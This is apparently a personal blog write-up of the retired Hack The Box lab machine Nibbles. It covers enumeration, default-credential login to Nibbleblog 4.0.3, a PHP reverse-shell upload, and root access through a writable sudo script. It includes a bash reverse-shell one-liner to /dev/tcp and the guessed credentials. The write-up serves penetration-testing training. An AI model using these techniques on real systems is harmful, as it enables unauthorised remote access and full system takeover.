---
title: "HTB - Nibbles writeup"
date: 2025-08-21 12:00:00 +00000
categories: [CTF, HTB]
tags: [CTF, easy, HTB, enumeration]
---

![Nibbles Box](/assets/images/nibbles/NIBBLES.png)

**OS :** Linux  
**Difficulty :** Easy  
**Machine IP :** 10.10.10.75

Nibbles is an easy retired box that showcases common enumeration tactics, basic web application exploitation, and a file-related misconfiguration for privilege escalation.

---

## Enumeration

First, we need to scan our target using `nmap` to see the open ports and services running on the target.  
![Nmap Scan](/assets/images/nibbles/nmap_scan.png)

We get:

- SSH open on port 22
    
- HTTP open on port 80
    

Let’s check port 80, but first let’s add the IP address to our `/etc/hosts`:  
![Domain Name](/assets/images/nibbles/domain_name.png)

Now that we’ve added the host, let’s check out the website:  
![Web View](/assets/images/nibbles/web_view.png)

We get nothing here… but after checking the source code, I found a hidden web directory: `/nibbleblog/`.  
![Source Page](/assets/images/nibbles/source_page.png)

Accessing this directory shows us a blog:  
![Blog Page](/assets/images/nibbles/blog_page.png)

Next, I did some directory enumeration to see if there were any hidden files or directories. Using the `common.txt` wordlist, I got:  
![Dir Enum](/assets/images/nibbles/dir_enum.png)   
![Dir Enum Result](/assets/images/nibbles/dir_enum_result.png)

There are some interesting results. The first thing I checked was the `README` file:  
![Readme](/assets/images/nibbles/readme.png)

It shows `Nibbleblog v4.0.3`.

Searching online, I found that it’s a CMS vulnerable to **Arbitrary File Upload**. To exploit this, we need credentials for the admin page.

After some enumeration, I discovered the username `admin`.  
![Username](/assets/images/nibbles/username.png)

I couldn’t find the password at first, but after a few guesses, I ended up with:

```
admin:nibbles
```

Now with credentials, I went to GitHub to check how to get RCE. From the code, I learned I need to upload a PHP reverse shell in `/content/private/plugins/my_image/`.  
![GitHub](/assets/images/nibbles/github.png)

So I went to the admin dashboard → Plugins → My Image → uploaded my reverse shell.  
![Reverse Shell Upload](/assets/images/nibbles/reverse_shell.png)  
![Uploaded Image](/assets/images/nibbles/uploaded_image.png)

---

## Getting a Shell

Then I set up a Netcat listener:  
![Get Shell](/assets/images/nibbles/get_shell.png)

Got the shell! I upgraded it with:

```bash
script /dev/null -c bash
```

![Shell Upgrade](/assets/images/nibbles/shell_upgrade.png)

We are now the user `nibbler`. In the home directory, I grabbed the first flag:  
![First Flag](/assets/images/nibbles/first_flag.png)

---

## Privilege Escalation

I ran:

```bash
sudo -l
```

![sudo](/assets/images/nibbles/sudo-l.png)

It showed that we can run the `monitor.sh` script as root. After unzipping the `personal.zip` file, I got the script.  
![Unzip The File](/assets/images/nibbles/'the zip fie.png')

Checking the file, I noticed I had write permission. So I overwrote it with a reverse shell:

```bash
echo "bash -c 'bash -i >& /dev/tcp/10.10.14.29/6666 0>&1'" > monitor.sh
```

![overwrote](/assets/images/nibbles/overrideFile.png)

Then I started another Netcat listener:  
![root reverse shell](/assets/images/nibbles/root_reverse_shell.png)

Finally, I ran the script as root:

```bash
sudo ./monitor.sh
```

![run the reverse shell](/assets/images/nibbles/'run the reverse shell.png')

And we got a **root shell**!  
![get the root shell](/assets/images/nibbles/get_root_shell.png)

Grabbed the root flag:  
![root flag](/assets/images/nibbles/root_flag.png)

---

and we are DONE  :)


